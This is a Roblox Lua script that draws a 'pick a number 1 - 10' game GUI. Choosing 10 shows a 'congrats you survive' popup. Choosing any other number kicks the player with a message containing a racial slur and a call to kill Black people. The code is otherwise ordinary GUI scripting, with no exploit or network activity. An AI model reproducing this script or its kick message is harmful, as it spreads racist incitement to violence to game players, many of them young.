local player = game.Players.LocalPlayer

-- Create GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PickNumberGui"
gui.ResetOnSpawn = false

-- Background Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 500, 0, 200)
frame.Position = UDim2.new(0.5, -250, 0.4, -100)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Title Label
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Pick a number 1 - 10"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 24

-- Branding ("xan")
local branding = Instance.new("TextLabel", frame)
branding.Size = UDim2.new(0, 100, 0, 20)
branding.Position = UDim2.new(1, -110, 1, -25)
branding.BackgroundTransparency = 1
branding.Text = "made by xan"
branding.TextColor3 = Color3.fromRGB(160, 160, 160)
branding.Font = Enum.Font.Gotham
branding.TextSize = 14
branding.TextXAlignment = Enum.TextXAlignment.Right

-- Congrats Popup Frame
local popup = Instance.new("TextLabel", gui)
popup.Size = UDim2.new(0, 300, 0, 100)
popup.Position = UDim2.new(0.5, -150, 0.7, -50)
popup.BackgroundColor3 = Color3.fromRGB(20, 120, 20)
popup.Text = "congrats you survive"
popup.TextColor3 = Color3.new(1, 1, 1)
popup.Font = Enum.Font.GothamBlack
popup.TextSize = 24
popup.Visible = false
Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 10)

-- Buttons 1–10
for i = 1, 10 do
	local button = Instance.new("TextButton", frame)
	button.Size = UDim2.new(0, 40, 0, 40)
	button.Position = UDim2.new(0, 10 + ((i - 1) * 48), 0, 60)
	button.Text = tostring(i)
	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamBold
	button.TextSize = 20
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseButton1Click:Connect(function()
		if i == 10 then
			popup.Visible = true
			frame.Visible = false

			task.delay(4, function()
				gui:Destroy()
			end)
		else
			player:Kick("Kill all niggers")
		end
	end)
end

